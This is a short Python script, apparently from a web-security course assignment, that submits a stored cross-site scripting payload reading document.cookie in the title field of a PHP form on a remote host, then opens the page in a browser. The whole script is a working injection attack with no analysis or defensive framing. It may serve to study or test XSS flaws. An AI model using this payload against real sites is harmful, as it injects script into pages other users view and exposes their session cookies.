from urllib import request, parse
import webbrowser

# base_url = "http://localhost:20080/Assignment/case04.php"
base_url = "http://iu.ru/Assignment/case19.php"
values = {"title": "<script>alert(document.cookie)</script>", "content": "content"}
data = parse.urlencode(values).encode()
req = request.Request(base_url, data=data)
resp = request.urlopen(req)

webbrowser.open(base_url, new=2)
